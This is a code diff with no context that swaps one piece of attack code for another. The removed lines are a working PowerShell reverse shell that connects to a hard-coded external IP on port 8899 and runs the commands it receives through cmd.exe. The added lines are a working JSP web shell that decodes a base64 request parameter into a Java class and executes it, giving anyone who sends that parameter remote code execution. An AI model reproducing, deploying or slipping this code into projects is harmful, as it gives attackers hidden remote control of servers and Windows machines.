@@ -1,54 +1,30 @@
-$socket = new-object System.Net.Sockets.TcpClient('152.32.187.141', 8899);
-if($socket -eq $null){exit 1}
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
-$buffer = new-object System.Byte[] 1024;
-$encoding = new-object System.Text.AsciiEncoding;
-do
-{
-	$writer.Flush();
-	$read = $null;
-	$res = ""
-	while($stream.DataAvailable -or $read -eq $null) {
-		$read = $stream.Read($buffer, 0, 1024)
-	}
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$args = "";
-		if($out.IndexOf(' ') -gt -1){
-			$args = $out.substring($out.IndexOf(' ')+1);
-			$out = $out.substring(0,$out.IndexOf(' '));
-			if($args.split(' ').length -gt 1){
-                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-                $pinfo.FileName = "cmd.exe"
-                $pinfo.RedirectStandardError = $true
-                $pinfo.RedirectStandardOutput = $true
-                $pinfo.UseShellExecute = $false
-                $pinfo.Arguments = "/c $out $args"
-                $p = New-Object System.Diagnostics.Process
-                $p.StartInfo = $pinfo
-                $p.Start() | Out-Null
-                $p.WaitForExit()
-                $stdout = $p.StandardOutput.ReadToEnd()
-                $stderr = $p.StandardError.ReadToEnd()
-                if ($p.ExitCode -ne 0) {
-                    $res = $stderr
-                } else {
-                    $res = $stdout
-                }
-			}
-			else{
-				$res = (&"$out" "$args") | out-string;
-			}
-		}
-		else{
-			$res = (&"$out") | out-string;
-		}
-		if($res -ne $null){
-        $writer.WriteLine($res)
-    }
-	}
-}While (!$out.equals("exit"))
-$writer.close();
-$socket.close();
-$stream.Dispose()
+<%!
+class CLOSURE extends ClassLoader{
+  CLOSURE(ClassLoader c){super(c);}
+  public Class inheritance(byte[] b){
+    return super.defineClass(b, 0, b.length);
+  }
+}
+public byte[] prime(String str) throws Exception {
+  Class base64;
+  byte[] value = null;
+  try {
+    base64=Class.forName("sun.misc.BASE64Decoder");
+    Object decoder = base64.newInstance();
+    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
+  } catch (Exception e) {
+    try {
+      base64=Class.forName("java.util.Base64");
+      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
+    } catch (Exception ee) {}
+  }
+  return value;
+}
+%>
+<%
+String cls = request.getParameter("qnmdhh");
+if (cls != null) {
+  new CLOSURE(this.getClass().getClassLoader()).inheritance(prime(cls)).newInstance().equals(new Object[]{request,response});
+}
+%>
